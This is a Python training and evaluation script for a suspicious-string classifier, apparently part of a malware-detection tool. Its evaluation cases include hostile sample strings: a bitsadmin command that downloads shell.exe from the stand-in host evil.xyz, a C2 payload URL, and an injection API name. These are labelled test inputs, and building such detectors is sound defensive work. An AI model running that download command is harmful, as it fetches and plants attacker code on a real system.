#!/usr/bin/env python3
"""
Training Script — RL Feedback Loop for String Classifier
---------------------------------------------------------
Usage:
    python train.py                          # Train with default settings
    python train.py --epochs 30             # More training epochs
    python train.py --lr 0.01              # Lower learning rate (more stable)
    python train.py --evaluate             # Evaluate model after training

This script:
  1. Loads or initialises the model weights.
  2. Runs the RL feedback loop over labelled training samples for N epochs.
  3. Prints per-epoch accuracy.
  4. Saves updated weights to models/string_model_weights.json
"""

import argparse
import random
import os
import json
from core.ml_model import StringClassifierModel, RLFeedbackTrainer


def load_training_data():
    from data.training_data import training_samples
    return training_samples


def train(epochs: int, learning_rate: float, shuffle: bool = True):
    os.makedirs("models", exist_ok=True)
    model = StringClassifierModel(model_file="models/string_model_weights.json")
    trainer = RLFeedbackTrainer(model=model, learning_rate=learning_rate)
    samples = load_training_data()

    print(f"\n{'='*60}")
    print(f"  String Classifier — RL Training Loop")
    print(f"  Samples: {len(samples)} | Epochs: {epochs} | LR: {learning_rate}")
    print(f"{'='*60}\n")

    for epoch in range(1, epochs + 1):
        if shuffle:
            random.shuffle(samples)

        correct = 0
        tp = tn = fp = fn = 0

        for text, ground_truth in samples:
            log = trainer.feedback_step(text, ground_truth_suspicious=ground_truth)

            predicted = log["predicted"]
            if predicted == ground_truth:
                correct += 1

            if predicted and ground_truth:
                tp += 1
            elif not predicted and not ground_truth:
                tn += 1
            elif predicted and not ground_truth:
                fp += 1
            else:
                fn += 1

        accuracy = correct / len(samples) * 100
        bar = "█" * int(accuracy / 5) + "░" * (20 - int(accuracy / 5))
        print(f"Epoch {epoch:02d}/{epochs}  [{bar}]  Acc: {accuracy:5.1f}%  "
              f"| TP:{tp} TN:{tn} FP:{fp} FN:{fn}")

    model.save_weights()
    print(f"\n✅ Training complete.")
    print(f"   Weights saved → models/string_model_weights.json")

    with open("models/string_model_weights.json", "r") as f:
        weights = json.load(f)
    print(f"\n📐 Learned Feature Weights:")
    for feat, val in sorted(weights.items(), key=lambda x: abs(x[1]), reverse=True):
        bar = "+" * int(abs(val) * 5) if val > 0 else "-" * int(abs(val) * 5)
        print(f"  {feat:<25} {val:+.4f}  {bar[:30]}")


def evaluate():
    """Quick evaluation on held-out test strings the model was NOT trained on."""
    model = StringClassifierModel(model_file="models/string_model_weights.json")

    eval_cases = [
        # (string, true_label, description)
        ("http://new-c2-server.ru/payload", True, "New C2 domain (unseen TLD .ru)"),
        ("NtMapViewOfSection", True, "Injection API"),
        ("bitsadmin.exe /transfer evil http://evil.xyz/shell.exe C:\\evil.exe", True, "LOLBin download"),
        ("WUB3AlExbRk9G2mP8nQzX6jLk", True, "High entropy obfuscated string"),
        ("GetWindowsDirectoryA", False, "Standard benign API"),
        ("https://www.google.com/help", False, "Legitimate URL"),
        ("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts", False, "Benign registry key"),
        ("Version 1.0.0.0", False, "Common version string"),
    ]

    training_texts = {text for text, _ in load_training_data()}
    eval_cases = [case for case in eval_cases if case[0] not in training_texts]

    print(f"\n{'='*65}")
    print(f"  Model Evaluation on Unseen Strings")
    print(f"{'='*65}")
    correct = 0
    for string, truth, desc in eval_cases:
        prob, predicted = model.predict_suspiciousness(string)
        status = "✅" if predicted == truth else "❌"
        label = "SUSP" if predicted else "SAFE"
        print(f"  {status} [{label}] p={prob:.3f} | {desc}")
        print(f"       → \"{string[:55]}\"")
        if predicted == truth:
            correct += 1

    print(f"\n  Eval Accuracy: {correct}/{len(eval_cases)} ({correct/len(eval_cases)*100:.0f}%)\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Train the string classifier via RL feedback loop.")
    parser.add_argument("--epochs", type=int, default=20, help="Number of training epochs (default: 20)")
    parser.add_argument("--lr", type=float, default=0.05, help="Learning rate (default: 0.05)")
    parser.add_argument("--no-shuffle", action="store_true", help="Disable dataset shuffling per epoch")
    parser.add_argument("--evaluate", action="store_true", help="Run evaluation after training")
    args = parser.parse_args()

    train(epochs=args.epochs, learning_rate=args.lr, shuffle=not args.no_shuffle)

    if args.evaluate:
        evaluate()
